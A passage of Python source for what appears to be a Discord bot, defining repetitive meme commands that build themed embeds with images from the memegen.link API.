        embed.set_image(url=f"""https://api.memegen.link/images/patrick/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="persian <Text 1> <Text 2>", description="Persian Cat Room Guardian")
    async def persian(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Persian Cat Room Guardian""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/persian/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="philosoraptor <Text 1> <Text 2>", description="Philosoraptor")
    async def philosoraptor(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Philosoraptor""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/philosoraptor/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="pigeon <Text 1> <Text 2>", description="Is this a pigeon meme")
    async def pigeon(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Is This a Pigeon?""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/pigeon/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="ptj <Text 1> <Text 2>", description="Phoebe Teaching Joey")
    async def ptj(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Phoebe Teaching Joey""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/ptj/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="puffin <Text 1> <Text 2>", description="Unpopular opinion puffin")
    async def puffin(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Unpopular opinion puffin""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/puffin/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="red <Text 1> <Text 2>", description="Oh, Is That What We're Going to Do Today?")
    async def red(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Oh, Is That What We're Going to Do Today?""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/red/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="regret <Text 1> <Text 2>", description="I Immediately Regret This Decision!")
    async def regret(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""I Immediately Regret This Decision!""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/regret/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="remembers <Text 1> <Text 2>", description="Pepperidge Farm Remembers")
    async def remembers(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Pepperidge Farm Remembers""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/remembers/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="rollsafe <Text 1> <Text 2>", description="Roll Safe")
    async def rollsafe(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Roll Safe""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/rollsafe/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="sadbiden <Text 1> <Text 2>", description="Sad Joe Biden")
    async def sadbiden(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Sad Joe Biden""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/sad-biden/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="sadboehner <Text 1> <Text 2>", description="Sad John Boehner")
    async def sadboehner(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Sad John Boehner""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/sad-boehner/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="sadbush <Text 1> <Text 2>", description="Sad George Bush")
    async def sadbush(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Sad George Bush""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/sad-bush/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="sadclinton <Text 1> <Text 2>", description="Sad Bill Clinton")
    async def sadclinton(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Sad Bill Clinton""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/sad-clinton/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="sadobama <Text 1> <Text 2>", description="Sad Barack Obama")
    async def sadobama(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Sad Barack Obama""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/sad-obama/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="sadfrog <Text 1> <Text 2>", description="Sad Frog / Feels Bad Man")
    async def sadfrog(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Sad Frog / Feels Bad Man""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/sadfrog/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="saltbae <Text 1> <Text 2>", description="Salt Bae")
    async def saltbae(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Salt Bae""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/saltbae/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="sarcasticbear <Text 1> <Text 2>", description="Sarcastic Bear")
    async def sarcasticbear(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Sarcastic Bear""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/sarcasticbear/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="sb <Text 1> <Text 2>", description="Scumbag Brain")
    async def sb(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Scumbag Brain""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/sb/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="scc <Text 1> <Text 2>", description="Sudden Clarity Clarence")
    async def scc(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Sudden Clarity Clarence""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/scc/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="sf <Text 1> <Text 2>", description="Sealed Fate")
    async def sf(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Sealed Fate""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/sf/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="sk <Text 1> <Text 2>", description="Skeptical Third World Kid")
    async def sk(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Skeptical Third World Kid""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/sk/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="ski <Text 1> <Text 2>", description="Super Cool Ski Instructor")
    async def ski(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Super Cool Ski Instructor""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/ski/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

